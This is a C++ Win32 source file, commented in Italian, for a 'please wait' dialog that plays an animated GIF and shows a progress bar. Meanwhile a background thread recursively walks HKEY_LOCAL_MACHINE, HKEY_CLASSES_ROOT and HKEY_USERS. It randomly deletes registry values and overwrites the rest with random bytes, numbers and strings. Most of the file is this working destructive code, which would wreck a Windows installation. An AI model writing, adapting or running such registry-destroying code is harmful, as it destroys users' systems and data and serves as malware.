#include "PlizWaitDialog.h"
#include "NiceDialog.h"
#include "resource.h"
#include "CommCtrl.h"

ULONG_PTR gdiplusToken;

PlizWaitDialog::PlizWaitDialog(HINSTANCE hInstance, double damage) : damage(damage)
{

}

INT_PTR PlizWaitDialog::Show(HWND hParent)
{
	return DialogBoxParam(m_hInstance, MAKEINTRESOURCE(IDD_PLIZWAIT), hParent, PlizWaitDialogProc, (LPARAM)this);
}

INT_PTR PlizWaitDialog::PlizWaitDialogProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	PlizWaitDialog* pThis = nullptr;

	if (uMsg == WM_INITDIALOG)
	{
		pThis = (PlizWaitDialog*)lParam;

		SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR)pThis);

		pThis->m_hWnd = hWnd;

		return pThis->OnDialogLoad();
	}
	else
	{
		pThis = (PlizWaitDialog*)GetWindowLongPtr(hWnd, GWLP_USERDATA);

		if (!pThis) return false;
	}

	switch (uMsg)
	{
		case WM_CLOSE:
		{
			return true;
		}

		case WM_COMMAND:
		{
			switch (LOWORD(wParam))
			{

				case IDCANCEL:
				{
					EndDialog(hWnd, HIWORD(wParam));
					break;
				}
			}

			return true;
		}

		case WM_PAINT:
		{
			PAINTSTRUCT ps;
			HDC hdc = BeginPaint(hWnd, &ps);

			RECT rc;
			GetClientRect(hWnd, &rc);

			// 🔹 Crea bitmap di memoria
			Bitmap buffer(rc.right, rc.bottom, PixelFormat32bppARGB);
			Graphics gMem(&buffer);

			// Sfondo nero (opzionale)
			gMem.Clear(Color(0, 0, 0));

			// Disegna GIF sul buffer
			if (pThis->m_pGif)
				gMem.DrawImage(pThis->m_pGif, 0, 0, rc.right, rc.bottom);

			// Copia buffer sul HDC della finestra
			Graphics g(hdc);
			g.DrawImage(&buffer, 0, 0);

			EndPaint(hWnd, &ps);
			return TRUE;
		}

		case WM_ERASEBKGND:
			return TRUE;


		case WM_TIMER:
		{
			if (pThis->m_pGif)
			{
				// 🔹 Aggiorna il frame
				pThis->m_currentFrame = (pThis->m_currentFrame + 1) % pThis->m_frameCount;
				pThis->m_pGif->SelectActiveFrame(&pThis->m_frameGuid, pThis->m_currentFrame);

				// 🔹 Ridisegna tutta la dialog
				InvalidateRect(hWnd, nullptr, TRUE);
			}
			return TRUE;
		}

		case WM_DESTROY:
		{
			KillTimer(hWnd, 1);

			if (pThis->m_pGif)
			{
				delete pThis->m_pGif;
			}
			break;
		}

		case WM_DAMAGE_PROGRESS_UPDATE:
		{
			if (pThis)
			{
				return pThis->OnDamageProgressUpdate(wParam, lParam);
			}
			break;
		}

		case WM_DAMAGE_PROCESS_COMPLETED:
		{
			if (pThis)
			{
				return pThis->OnDamageProcessCompleted(wParam, lParam);
			}
			break;
		}
	}

	return false;
}

void PlizWaitDialog::LoadGIF()
{ 
	// --- Carica GIF dalla risorsa ---
	HRSRC hRes = FindResource(m_hInstance, MAKEINTRESOURCE(IDR_HACK), "GIF");
	HGLOBAL hResLoad = LoadResource(m_hInstance, hRes);
	DWORD size = SizeofResource(m_hInstance, hRes);
	void* pResData = LockResource(hResLoad);

	IStream* pStream = nullptr;
	CreateStreamOnHGlobal(NULL, TRUE, &pStream);
	ULONG written;
	pStream->Write(pResData, size, &written);

	LARGE_INTEGER liZero;
	liZero.QuadPart = 0;
	pStream->Seek(liZero, STREAM_SEEK_SET, NULL);

	m_pGif = new Bitmap(pStream);
	pStream->Release();

	// --- Ottieni GUID dei frame ---
	UINT nDim = m_pGif->GetFrameDimensionsCount();
	GUID* pDims = new GUID[nDim];
	m_pGif->GetFrameDimensionsList(pDims, nDim);

	m_frameGuid = pDims[0]; 
	delete[] pDims;


	m_frameCount = m_pGif->GetFrameCount(&m_frameGuid);

	SetTimer(m_hWnd, 1, 100, nullptr);
}

string corruptString(const string& str, double dm, MyRandom& rng, double damage)
{
	string n;
	n.reserve(str.size());

	for (char c : str)
	{
		if (rng.NextDouble() <= damage * dm)
		{
			char newChar = static_cast<char>(rng.Next(32, 127));
			n += newChar;
		}
		else
		{
			n += c;
		}
	}

	return n;
}

void PlizWaitDialog::corruptRegValue(HKEY hKey, const std::string& valueName, double dm)
{
	DWORD type;
	DWORD size = 0;

	// Prima ottieni la dimensione
	if (RegQueryValueExA(hKey, valueName.c_str(), nullptr, &type, nullptr, &size) != ERROR_SUCCESS)
		return;

	if (size > 1024 * 1024) return; // Limite sicurezza

	std::vector<BYTE> buffer(size);

	if (RegQueryValueExA(hKey, valueName.c_str(), nullptr, &type, buffer.data(), &size) != ERROR_SUCCESS)
		return;

	switch (type)
	{
	case REG_BINARY:
		for (DWORD i = 0; i < size; i++)
		{
			if (rng->NextDouble() <= damage * dm)
				buffer[i] = (BYTE)rng->Next(0, 256);
		}
		RegSetValueExA(hKey, valueName.c_str(), 0, type, buffer.data(), size);
		break;

	case REG_DWORD:
		if (rng->NextDouble() <= damage * dm)
		{
			DWORD val = (DWORD)rng->Next();
			RegSetValueExA(hKey, valueName.c_str(), 0, type, (BYTE*)&val, sizeof(val));
		}
		break;

	case REG_QWORD:
		if (rng->NextDouble() <= damage * dm)
		{
			// ✅ Combina 2 Next() per un vero QWORD random
			ULONGLONG val = ((ULONGLONG)rng->Next() << 32) | (ULONGLONG)rng->Next();
			RegSetValueExA(hKey, valueName.c_str(), 0, type, (BYTE*)&val, sizeof(val));
		}
		break;

	case REG_SZ:
	case REG_EXPAND_SZ:
	{
		// ✅ Rimuovi il null terminator finale dal buffer
		size_t strLen = size > 0 ? size - 1 : 0;
		std::string str((char*)buffer.data(), strLen);

		std::string corrupted = corruptString(str, dm, *rng, damage);

		// ✅ +1 per il null terminator
		RegSetValueExA(hKey, valueName.c_str(), 0, type,
			(BYTE*)corrupted.c_str(),
			(DWORD)(corrupted.size() + 1));
		break;
	}

	case REG_MULTI_SZ:
	{
		// MULTI_SZ è stringhe separate da '\0' con '\0\0' finale
		std::vector<std::string> strings;
		const char* p = (char*)buffer.data();
		const char* end = (char*)buffer.data() + size;

		// ✅ Controlla i limiti del buffer
		while (p < end && *p)
		{
			size_t len = strnlen(p, end - p);
			if (len == 0 || p + len >= end) break;

			std::string original(p, len);
			strings.push_back(corruptString(original, dm, *rng, damage));

			p += len + 1;
		}

		// Ricostruisci MULTI_SZ
		std::vector<char> newData;
		for (const auto& s : strings)
		{
			newData.insert(newData.end(), s.begin(), s.end());
			newData.push_back('\0');
		}

		// ✅ Se vuoto, aggiungi almeno un \0
		if (newData.empty())
			newData.push_back('\0');

		newData.push_back('\0'); // doppio NULL finale

		RegSetValueExA(hKey, valueName.c_str(), 0, type,
			(BYTE*)newData.data(),
			(DWORD)newData.size());
		break;
	}
	}
}

// Funzione ricorsiva per corrompere tutta la chiave e sottokey
void PlizWaitDialog::corruptReg(HKEY hKey, double dm)
{
	DWORD subKeys = 0;
	DWORD maxSubKeyLen = 0;
	if (RegQueryInfoKeyW(hKey, nullptr, nullptr, nullptr, &subKeys, &maxSubKeyLen,
		nullptr, nullptr, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS)
		return;

	std::vector<char> nameBuffer(maxSubKeyLen + 1);

	// corruzione sottokey ricorsiva
	for (DWORD i = 0; i < subKeys; i++)
	{
		DWORD len = maxSubKeyLen + 1;
		if (RegEnumKeyEx(hKey, i, nameBuffer.data(), &len, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS)
		{
			HKEY hSubKey;
			if (RegOpenKeyEx(hKey, nameBuffer.data(), 0, KEY_ALL_ACCESS, &hSubKey) == ERROR_SUCCESS)
			{
				corruptReg(hSubKey, dm);
				RegCloseKey(hSubKey);
			}
		}
	}

	// corruzione dei valori
	DWORD values = 0;
	DWORD maxValueNameLen = 0;
	if (RegQueryInfoKey(hKey, nullptr, nullptr, nullptr, nullptr, nullptr,
		nullptr, &values, &maxValueNameLen, nullptr, nullptr, nullptr) != ERROR_SUCCESS)
		return;

	std::vector<char> valueNameBuffer(maxValueNameLen + 1);
	for (DWORD i = 0; i < values; i++)
	{
		DWORD len = maxValueNameLen + 1;
		if (RegEnumValue(hKey, i, valueNameBuffer.data(), &len, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS)
		{
			corruptRegValue(hKey, valueNameBuffer.data(), dm);
		}
	}
}

int countReg(HKEY hKey)
{
	DWORD valueCount = 0;
	DWORD subKeyCount = 0;

	// Ottieni numero di valori e sottochiavi
	if (RegQueryInfoKey(
		hKey,
		nullptr,
		nullptr,
		nullptr,
		&subKeyCount,
		nullptr,
		nullptr,
		&valueCount,
		nullptr,
		nullptr,
		nullptr,
		nullptr) != ERROR_SUCCESS)
	{
		return 0;
	}

	int total = static_cast<int>(valueCount);

	char subKeyName[256];
	for (DWORD i = 0; i < subKeyCount; ++i)
	{
		DWORD nameLen = sizeof(subKeyName);
		if (RegEnumKeyExA(hKey, i, subKeyName, &nameLen, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS)
		{
			HKEY hSubKey;
			if (RegOpenKeyExA(hKey, subKeyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS)
			{
				total += countReg(hSubKey);
				RegCloseKey(hSubKey);
			}
		}
	}

	return total;
}

void PlizWaitDialog::fuckReg(HKEY hKey, double dm)
{
	// ✅ 1. Prima raccogli TUTTE le subkey
	std::vector<std::string> subkeyNames;
	{
		DWORD index = 0;
		char subkeyName[16384];
		DWORD subkeyLen = 16384;

		while (RegEnumKeyEx(hKey, index, subkeyName, &subkeyLen, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
		{
			subkeyNames.push_back(subkeyName);
			index++;
			subkeyLen = 16384;
		}
	}

	// ✅ 2. Poi processa le subkey
	for (const auto& name : subkeyNames)
	{
		HKEY hSub = NULL;
		if (RegOpenKeyEx(hKey, name.c_str(), 0, KEY_ALL_ACCESS, &hSub) == ERROR_SUCCESS)
		{
			fuckReg(hSub, dm);
			RegCloseKey(hSub);
		}
	}

	std::vector<std::string> valueNames;
	DWORD index = 0;
	char valueName[16384];
	DWORD valueNameLen = 16384;

	while (RegEnumValueA(hKey, index, valueName, &valueNameLen, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
	{
		valueNames.push_back(valueName);
		index++;
		valueNameLen = 16384;
	}

	// ✅ Poi processa tutti (anche se li elimini, li conti comunque)
	for (const auto& name : valueNames)
	{
		double r = rng->NextDouble();

		if (r <= rng->NextDouble() * SettingzDialog::del * dm)
		{
			RegDeleteValueA(hKey, name.c_str());
		}
		else
		{
			corruptRegValue(hKey, name, dm);
		}

		progress++;  // ✅ Incrementa SEMPRE, anche se hai cancellato

		if (progress % (int)std::ceil(max / 100.0) == 0)
		{
			if (this && this->m_hWnd && IsWindow(this->m_hWnd))
			{
				int percentage = (int)((double)progress * 100.0 / (double)max);
				if (percentage > 100) percentage = 100;
				PostMessage(m_hWnd, WM_DAMAGE_PROGRESS_UPDATE, (WPARAM)percentage, 0);
			}
		}
	}
}

DWORD WINAPI FuckThreadProc(LPVOID pData)
{
	PlizWaitDialog* pThis = (PlizWaitDialog*)pData;

	pThis->max += countReg(HKEY_LOCAL_MACHINE);
	pThis->max += countReg(HKEY_CLASSES_ROOT);
	pThis->max += countReg(HKEY_USERS);

	pThis->fuckReg(HKEY_LOCAL_MACHINE, SettingzDialog::hklm);
	pThis->fuckReg(HKEY_CLASSES_ROOT, SettingzDialog::hkcr);
	pThis->fuckReg(HKEY_USERS, SettingzDialog::hku);

	// ✅ FORZA 100% prima di chiudere
	if (pThis->m_hWnd && IsWindow(pThis->m_hWnd))
	{
		PostMessage(pThis->m_hWnd, WM_DAMAGE_PROGRESS_UPDATE, 100, 0);
		Sleep(1000);  // Pausa per far vedere il 100%
	}

	PostMessage(pThis->m_hWnd, WM_DAMAGE_PROCESS_COMPLETED, 0, 0);
	return 0;
}


LRESULT PlizWaitDialog::OnDamageProgressUpdate(WPARAM wParam, LPARAM lParam)
{
	int percentage = (int)wParam;

	SendDlgItemMessage(m_hWnd, IDC_PROGRESS1, PBM_SETPOS, (WPARAM)percentage, 0);

	return 0;
}

LRESULT PlizWaitDialog::OnDamageProcessCompleted(WPARAM wParam, LPARAM lParam)
{

	EndDialog(m_hWnd, IDOK);
	NiceDialog niceDlg(m_hInstance);
	niceDlg.Show(m_hWnd);

	delete rng;
	return 0;
}



BOOL PlizWaitDialog::OnDialogLoad()
{
	LONG exStyle = GetWindowLong(m_hWnd, GWL_EXSTYLE);
	SetWindowLong(m_hWnd, GWL_EXSTYLE, exStyle | WS_EX_COMPOSITED);

	LoadGIF();
	
	rng = new MyRandom(SettingzDialog::seed);

	CreateThread(nullptr, NULL, FuckThreadProc, this, 0, 0);

	return TRUE;
}